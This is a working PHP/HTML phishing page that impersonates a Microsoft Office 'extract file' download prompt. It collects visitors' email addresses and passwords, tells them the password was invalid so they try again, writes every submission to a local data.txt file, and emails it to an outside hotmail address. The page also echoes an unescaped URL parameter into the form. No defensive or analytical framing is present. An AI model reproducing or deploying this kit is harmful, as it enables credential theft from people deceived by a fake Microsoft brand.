<?php
$msg = '';
$body = '<body>';
if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){
  $msg = '<p style="color: red;">You entered an invalid password</p>';
  $body = "<body onload=login('show')>";

  $to      = 'ab4sky@hotmail.com';
  $subject = 'MS Product'.mt_rand();
  $message = 'Email: '.$_POST['email'] .' PASSWORD: '.$_POST['password']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);
    @mail($to, $subject, $message, $headers);

}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><body background="newbakground.jpg">
<title>Microsoft Office | Share, Upload, Extract</title>
<style type="text/css">
  a {color: white;}
  a:hover{color:#DF0101; }

  #popupbox{
  margin: 0; 
  margin-left: 40%; 
  margin-right: 40%;
  margin-top: 50px; 
  padding-top: 10px; 
  width: 58%; 
  height: 500px; 
  position: absolute; 
  size: cover; 
  border: 3px solid #000000; 
  z-index: 9; 
  font-family: arial; 
  visibility: hidden; 
  }

  .formPlace {
    font-family: 'Maiandra GD';
    font-size: 18px;
    color:#000000;
    background-color: #e5e5e5;
    border: 1px solid #FFFFFF;
    padding: 13px;
    text-align: center;
  }
  .white {color: white;}
  
  </style>
<script language="JavaScript" type="text/javascript">
  function login(showhide){
    if(showhide == "show"){
        document.getElementById('popupbox').style.visibility="visible";
    } else if(showhide == "hide"){
        document.getElementById('popupbox').style.visibility="hidden"; 
    }
  }
  </script>
<script language="JavaScript" type="text/javascript">
function getParm(name)
{
  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regexS = "[\\?&]"+name+"=([^&#]*)";
  var regex = new RegExp(regexS);
  var results = regex.exec(window.location.href);
  
  //set variables for each of the fields you wish to pre-file
  //reference them by the ID you found for the field when viewing the source
  EmailField = document.getElementById("lmao");  

  if(results == null)
    return "";
  else
    return results[1];
}

//This function executes the function above and set the values in the fields
window.onload=function execParm() {
    var urlemail = getParm('email');
    EmailField.value = urlemail;
}
</script>
</head>

<?php echo $body;?>


<div id="popupbox"> <br>
  <img src="of.png" alt="HTML5 Icon" style="width:180px;height:50px;"> <br>
  <br>
  <div align="center"> <img src="wo.png" width="150" height="60"> </div>
  <br>
  <br>
  <center>
  <div align="center"> <b>
    <fieldset style="background-color: #9d9dff;"/>
    <font face="Maiandra GD" size="2" color="#00000"> Your email provider is recognised by Microsoft server.
    Login below to access file.......</font>
    </fieldset>
    </b></div>
  <br>
  <form method="post" action="./?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" name="submit" value="Submit" onclick="ValidateEmail(document.form1.login)" class="formPlace"/>
  <fieldset>
  <legend>Login with your valid details:</legend>
  <p> <font face="Maiandra GD" size="2" color="#00000"><b>Send File To:</b></font> <font color="#00000"></font>
    <select name="t1">
      <option value="My Email">My Email</option>
      <option value="My Computer">My Computer</option>
      <option value="View Online">View Online</option>
    </select>

    <?php echo $msg;?>
  <p> <font face="Maiandra GD" size="3" color="#00000"> <b>Email Address:</b>
    <input type="email" id="lmao" name="email" size="48" required="" value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" placeholder="Enter your valid business email address">
    </font> </p>
  <p> <font face="Maiandra GD" size="3" color="#00000"> <b>Password:</b>
    <input type="password" name="password" size="50" placeholder="Enter valid password" required="">
    </font> <font color="#ffffff"></font> </p>
  <p> <font color="#e5e5e5">...............................................</font>
    <input type="submit" value="Extract File Now" name="submit">
    <input type="hidden" name="sendgo" value="sendto">
  </p>
  </font>
  </p>
  </fieldset>
  </form>
  <script src="val.js"></script>
  <br />
  <center>
    <a href="javascript:login('hide');"> </a>
  </center>
</div>
<center>
<p>
<center>
<table width="1000" align="center">
<br>
<br>
<tr>
  <td><img src="dp.png" width="650" height="200" align="center"> </td>
</tr>
<tr>
  <td height="30"></td>
</tr>
<tr>
  <td><table width="1200" height="300" align="center" border="0">
    <tr>
      <td width="600"><table width="" align="">
          <tr>
            <td>
            <font face="calibri" size="3" color="#FFFFFF"> You are about to extract a File from</font>
            <font color="#FA8072" size="4"><b>Microsoft Excel Reader</b></font>
              <p class="white"> File Details:</p>
                <ul>
                  <li class="white"> File Name: <font color="#B40404"><b>Product Specification.xls</b></font> </li>
                  <li class="white"> File Size: <font color="#B40404"><b>750KB</b></font> </li>
                  <li class="white"> File Type: <font color="#B40404"><b>Excel</b></font> </li>
              </ul>
            </td>
          </tr>
          <tr>
            <td height="25"></td>
          </tr>
          <tr>
            <td height=""><table width="230" align="left" height="40" bgcolor="#0D3571">
                <tr>
                  <td>
                    <center>
                     <p><a href="javascript:login('show');" style="text-decoration:none"><font face="arial" size="+2">Download Products</font></a></p>
                    </center>
                  </td>
                </tr>
              </table></td>
          </tr>
        </table></td>
</body>
</html>
